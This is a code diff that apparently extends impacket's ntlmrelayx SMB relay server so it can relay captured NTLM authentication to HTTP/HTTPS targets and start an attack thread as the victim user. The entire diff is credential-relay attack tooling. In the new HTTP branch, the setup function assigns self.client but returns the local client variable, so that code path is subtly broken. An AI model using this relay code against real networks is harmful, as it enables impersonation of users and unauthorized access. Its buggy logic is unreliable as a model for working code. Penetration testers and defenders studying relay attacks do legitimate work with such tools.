@@ -23,7 +23,7 @@ import logging
 from impacket import smb, ntlm
 from impacket.nt_errors import STATUS_MORE_PROCESSING_REQUIRED, STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.spnego import SPNEGO_NegTokenResp, SPNEGO_NegTokenInit, TypesMech
-from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient
+from impacket.examples.ntlmrelayx.clients import SMBRelayClient, MSSQLRelayClient, LDAPRelayClient, HTTPRelayClient
 from impacket.smbserver import SMBSERVER, outputToJohnFormat, writeJohnOutputToFile
 from impacket.spnego import ASN1_AID
 from impacket.examples.ntlmrelayx.utils.targetsutils import ProxyIpTranslator
@@ -364,6 +364,8 @@ class SMBRelayServer(Thread):
             client = MSSQLRelayClient(self.target[1],self.target[2])
         if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
             client = LDAPRelayClient("%s://%s:%d" % (self.target[0].lower(),self.target[1],self.target[2]))
+        if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+            self.client = HTTPRelayClient("%s://%s:%d/%s" % (self.target[0].lower(),self.target[1],self.target[2],self.target[3]))
         return client
 
     #Do the NTLM negotiate
@@ -403,6 +405,7 @@ class SMBRelayServer(Thread):
                 logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
                 logging.error(str(e))
                 errorCode = STATUS_ACCESS_DENIED
+
         if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
             #This client needs a proper response code
             try:
@@ -423,6 +426,19 @@ class SMBRelayServer(Thread):
                 logging.error(str(e))
                 errorCode = STATUS_ACCESS_DENIED
 
+        if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+            try:
+                result = client.sendAuth(token) #Result is a boolean
+                if result:
+                    errorCode = STATUS_SUCCESS
+                else:
+                    logging.error("HTTP NTLM auth against %s as %s FAILED" % (self.target[1],self.authUser))
+                    errorCode = STATUS_ACCESS_DENIED
+            except Exception, e:
+                logging.error("NTLM Message type 3 against %s FAILED" % self.target[1])
+                logging.error(str(e))
+                errorCode = STATUS_ACCESS_DENIED
+
         return clientResponse, errorCode
 
     def do_attack(self,client):
@@ -432,7 +448,10 @@ class SMBRelayServer(Thread):
             clientThread.start()
         if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
             clientThread = self.config.attacks['LDAP'](self.config, client, self.authUser)
-            clientThread.start()    
+            clientThread.start()
+        if self.target[0] == 'HTTP' or self.target[0] == 'HTTPS':
+            clientThread = self.config.attacks['HTTP'](self.config, client, self.authUser)
+            clientThread.start()
 
     def _start(self):
         self.server.serve_forever()
